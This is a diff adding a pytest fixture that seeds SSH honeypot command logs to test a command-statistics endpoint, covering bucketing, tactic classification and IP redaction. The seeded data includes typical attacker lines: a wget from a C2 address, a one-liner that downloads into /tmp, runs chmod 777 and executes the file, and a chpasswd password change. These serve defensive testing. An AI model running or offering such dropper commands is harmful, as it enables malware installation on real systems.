@@ -255,6 +255,55 @@ def charset_seed(db_session: Session) -> dict[str, Any]:
 
 
 @pytest.fixture()
+def command_seed(db_session: Session) -> dict[str, Any]:
+    """Seed atomic + compound commands for the Commands page aggregates.
+
+    Exercises every branch the ``/stats/commands`` endpoint depends on:
+
+    * executable bucketing -- ``/bin/uname`` and ``uname -a`` collapse with
+      bare ``uname`` (count 3);
+    * tactic classification -- recon (``uname``/``whoami``) vs download
+      (``wget``);
+    * the atomic/compound split -- the two chained one-liners go to
+      ``top_lines``, never the atomic top list;
+    * IP redaction -- the C2 host in the ``wget`` URL must not survive.
+
+    Isolated from :func:`seed_data` so the exact-count assertions stand alone.
+    """
+    now = datetime.now(timezone.utc)
+    session = HoneypotSession(
+        id="cmd-001",
+        src_ip="203.0.113.50",
+        src_port=40001,
+        dst_port=22,
+        protocol="ssh",
+        started_at=now,
+        sensor="sensor-1",
+    )
+    db_session.add(session)
+    db_session.flush()
+
+    inputs = [
+        # atomic -- three uname forms collapse to one bucket
+        "uname -a",
+        "/bin/uname",
+        "uname",
+        # atomic -- recon + a download carrying a C2 IP (redaction probe)
+        "whoami",
+        "wget http://203.0.113.99/meow",
+        # compound -- chained/piped dropper lines -> top_lines, not atomic
+        "cd /tmp; wget http://203.0.113.99/x; chmod 777 x; ./x",
+        "echo 'pw' | chpasswd",
+    ]
+    db_session.add_all(
+        Command(session_id="cmd-001", input=text, success=True, timestamp=now)
+        for text in inputs
+    )
+    db_session.flush()
+    return {"session": session, "inputs": inputs}
+
+
+@pytest.fixture()
 def ip_fanout_seed(db_session: Session) -> dict[str, Any]:
     """Seed a shared credential tried from two distinct IPs + a single-IP one.
 
